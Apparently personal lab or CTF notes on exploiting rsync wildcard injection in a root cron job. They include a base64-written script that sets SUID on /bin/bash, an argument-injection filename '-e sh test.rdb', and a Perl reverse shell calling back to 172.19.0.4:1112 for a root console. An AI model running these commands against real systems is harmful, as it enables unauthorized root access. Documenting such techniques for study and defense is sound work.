
**rsync** is a utility for [transferring](https://en.wikipedia.org/wiki/File_transfer "File transfer") and [synchronizing](https://en.wikipedia.org/wiki/File_synchronization "File synchronization") [files](https://en.wikipedia.org/wiki/Computer_file "Computer file") between a computer and a storage drive and across [networked](https://en.wikipedia.org/wiki/Computer_network "Computer network") [computers](https://en.wikipedia.org/wiki/Computer "Computer") by comparing the [modification times](https://en.wikipedia.org/wiki/Timestamping_(computing) "Timestamping (computing)") and sizes of files.

As rsync accept wilcards to perfomor its task, we could find a way of injecting a malicious code by creating a file with permited extension
https://gtfobins.github.io/gtfobins/rsync/#shell
### Rsync usage
`rsync rsync://172.20.0.3
## Analyzing a vulnerable configuration

![[Pasted image 20240406191115.png]]
In this case content of */var/www/html/f187a0ec71ce99642e4f0afbd441a68b* is being synchronized with server *backup* by loading all *.rdb* files to it

If there is write permission in this vulnerable directory we could create a *.rdb* file which grant SUID permissions.

File test.rdb:

`#!/bin/bash`
`chmod u+s /bin/bash`

````
echo IyEvYmluL2Jhc2gKY2htb2QgdStzIC9iaW4vYmFzaAo= | base64 -d > test.rdb
````
Analysing the payload found in gftobins:
`rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null`

*rsync* can execute commands with -e, so if we create a file named *-e sh test.rdb*, it will read it because it ends in *rdb* and after that execute it. As test.rdb exists as well, we will grant /bin/bash SUID permission. **We are considering that root is executing this task**

`touch -- '-e sh test.rdb'`

Waiting for cron task to be executed, we have SUID access for /bin/bash
![[Pasted image 20240406194103.png]]

### Alternative: Reverse shell executed by root in the vulnerable cron
In lieu of creating the file to grand SUID, we can load a reverse shell to *node-red* machine that by using socket will transmit it to us:

reverse_perl.rdb:
````
perl -e 'use Socket;$i="172.19.0.4";$p=1112;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
````

````
echo cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTcyLjE5LjAuNCI7JHA9MTExMjtzb2NrZXQoUyxQRl9JTkVULFNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCJ0Y3AiKSk7aWYoY29ubmVjdChTLHNvY2thZGRyX2luKCRwLGluZXRfYXRvbigkaSkpKSl7b3BlbihTVERJTiwiPiZTIik7b3BlbihTVERPVVQsIj4mUyIpO29wZW4oU1RERVJSLCI+JlMiKTtleGVjKCIvYmluL3NoIC1pIik7fTsnCg== | base64 -d > reverse_perl.rdb
````

`touch -- '-e sh reverse_perl.rdb'`

We get a root console:

![[Pasted image 20240406201523.png]]

